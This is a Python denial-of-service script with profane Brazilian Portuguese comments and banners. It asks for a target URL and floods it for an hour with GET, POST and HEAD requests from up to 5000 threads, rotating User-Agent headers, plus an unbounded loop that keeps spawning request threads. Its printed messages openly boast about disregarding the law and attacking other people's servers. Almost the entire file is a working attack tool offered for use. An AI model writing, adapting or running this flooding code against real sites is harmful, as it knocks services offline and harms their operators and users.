#!/usr/bin/env python3
"""
🚨 DDOS BRABO - SÓ NA PORRADA 🚨
⚠️ FODA-SE AS CONSEQUÊNCIAS!
"""

import threading
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

class ZetaDDoSFudido:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        self.active_threads = 0
        self.max_threads = 5000  # METEU O FODA-SE PRA CPU KKKKKKKKKKKKKKKKKKKKKKKKK 
        self.is_attacking = False
        
    def get_random_headers(self):
        """Gera headers aleatórios pra foder com tudo"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def send_request(self, target_url, timeout=20):
        """Manda requisição sem dó porra"""
        try:
            response = requests.get(
                target_url,
                headers=self.get_random_headers(),
                timeout=timeout,
                verify=True  
            )
            print(f"📡 Tiro dados rs - Status: {response.status_code}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"❌ Erro...: {e}")
            return False
        finally:
            self.active_threads -= 1
    
    def attack_worker(self, target_url, duration):
        end_time = time.time() + duration
        
        while time.time() < end_time and self.is_attacking:
            if self.active_threads < self.max_threads:
                self.active_threads += 1
                thread = threading.Thread(
                    target=self.send_request, 
                    args=(target_url,)
                )
                thread.daemon = True
                thread.start()
            
            time.sleep(0.001)  # Sem dó porra
    
    def ataque_nuclear(self, target_url):
        """MODO SURUBÃO - ARROMBA TUDO PORRA"""
        while self.is_attacking:
            threading.Thread(target=requests.get, args=(target_url,)).start()
            threading.Thread(target=requests.post, args=(target_url,)).start() 
            threading.Thread(target=requests.head, args=(target_url,)).start()
    
    def comecar_porrada(self, target_url, duration=3600, thread_count=5000):
        """
        Começa o caralho do ataque
        
        Args:
            target_url: URL alvo (FODA-SE SE É LOCAL!)
            duration: 3600 segundos de porrada
            thread_count: 5000 threads pra arrebentar tudo
        """
        
        print("🚨 AVISO.. TÔ CAGANDO PRA LEI, DEU PROBLEMA?, PROBLEMA E SEU!")
        print("🔒 VAI SE FODER SERVIDOR ALHEIOOOOOOOOOO!")
        print("⚖️ PRESO? 🙃 FODA-SE!")
        print("━" * 50)
        
        print(f"🎯 COMECANDO PORRADA EM: {target_url}")
        print(f"⏰ DURAÇÃO: {duration} SEGUNDOS - 1 HORA DE SURRA!")
        print(f"🧵 THREADS: {thread_count} - PROCESSADOR VAI CHORAR!")
        
        self.is_attacking = True
        self.max_threads = thread_count
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for _ in range(thread_count):
                executor.submit(self.attack_worker, target_url, duration)
        
        nuclear_thread = threading.Thread(target=self.ataque_nuclear, args=(target_url,))
        nuclear_thread.daemon = True
        nuclear_thread.start()
        
        print(f"🔥 PORRADA EM ANDAMENTO... ({duration}s)")
        time.sleep(duration)
        
        self.is_attacking = False
        print("✅ ACABOU A PORRADA! SERVIDOR FOI PRO CARALHO!")
        return True

if __name__ == "__main__":
    ddos = ZetaDDoSFudido()
    
    print("🤖 DDOS DO CARALHO PORRA 👻")
    print("Instagram: @gustavo.rtz😋")
    print("━" * 50)
    
    target = input("🎯 Manda a URL DO SITE: ")
    
    if target:
        print(f" VAI TOMAR NO CU: {target}")
        
        # FODA-SE CONFIRMAÇÃO
        confirm = input("rsrsr Bota pra foder? (s/N): ")
        
        if confirm.lower() == 's':
            # PORRADA TOTAL
            ddos.comecar_porrada(
                target_url=target,
                duration=3600,
                thread_count=5000
            )
        else:
            print("🚫 FRANGO DO CARALHO!")